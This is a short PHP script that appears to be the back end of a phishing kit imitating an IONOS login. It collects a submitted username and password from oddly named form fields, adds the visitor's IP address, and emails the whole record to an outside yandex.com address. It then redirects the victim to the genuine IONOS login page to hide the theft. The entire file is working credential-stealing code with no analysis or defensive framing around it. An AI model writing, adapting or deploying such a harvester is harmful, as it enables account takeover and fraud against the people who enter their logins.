<?

$ip = $_SERVER['REMOTE_ADDR'];
$message  = "=============+[ Malo-Baba Legbegbe ]+=========\n";
$message .= "USaR : ".$_POST['boyio']."\n";
$message .= "PaSA : ".$_POST['girlieo']."\n";
$message .= "============= [ Location Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";


$from = "From: MaLo-BabA<Beejay>";
$subj = "Malobaba LgZ";
mail("officebillionaires@yandex.com",$subj,$message,$from);

header("Location: https://login.ionos.com/?ionos-tour=enabled");

?>